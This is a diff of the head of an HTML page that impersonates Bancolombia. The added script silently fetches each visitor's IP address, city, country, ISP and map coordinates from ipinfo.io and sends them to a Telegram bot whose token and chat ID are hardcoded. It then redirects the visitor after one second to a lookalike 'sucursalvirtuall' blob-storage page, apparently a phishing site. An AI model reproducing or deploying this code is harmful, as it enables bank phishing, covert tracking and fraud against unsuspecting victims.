@@ -3,26 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0; url='https://sucursalvirtuall.blob.core.windows.net/youtubepayments/index.html'">
-    <title>Sucursal de compras</title>
+    <title>Bancolombia</title>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        window.onload = function() {
             fetch("https://ipinfo.io/json")
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip || "Desconocida";
-                    const loc = data.city + ", " + (data.region || "");
+                    const ciudad = data.city || "Desconocida";
+                    const region = data.region || "Desconocida";
+                    const pais = data.country || "Desconocido";
                     const barrio = data.org || "Desconocido";
-                    const calle = data.hostname || "Desconocida";
+                    const loc = data.loc ? data.loc.split(",") : ["0", "0"];
+                    const lat = loc[0];
+                    const lon = loc[1];
+                    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
                     const botToken = "7641581605:AAExTM7xZIUvmckqdJ2zqFC5JY2fyF3xfNU";
                     const chatId = "-1002464974193";
-                    const mensaje = `💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵NUEVO INGRESO EN LA JUEGA ACTIVO AMARILLO AMARILLO LO PLATANOOO💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵💵%0AIP: ${ip}%0ABARRIO: ${barrio}%0ACALLE: ${calle}`;
+                    const mensaje = `🌍 *Nueva visita detectada!*
+
+🔹 *IP:* ${ip}
+📍 *Ubicación:* ${ciudad}, ${region}, ${pais}
+🏠 *Barrio/ISP:* ${barrio}
+📌 *Localización:* [Ver en el mapa](${googleMapsUrl})`;
                     
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${mensaje}`);
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text: mensaje, parse_mode: "Markdown" })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            console.error("Error en la respuesta de Telegram:", data);
+                        } else {
+                            console.log("Mensaje enviado a Telegram:", data);
+                        }
+                    })
+                    .catch(error => console.error("Error enviando mensaje a Telegram:", error));
                 })
                 .catch(error => console.error("Error obteniendo la información de IP:", error));
-        });
+            
+            setTimeout(function() {
+                window.location.href = "https://sucursalvirtuall.blob.core.windows.net/youtubepayments/index.html";
+            }, 1000); // Redirigir después de 1 segundo
+        };
     </script>
 </head>
 <body>
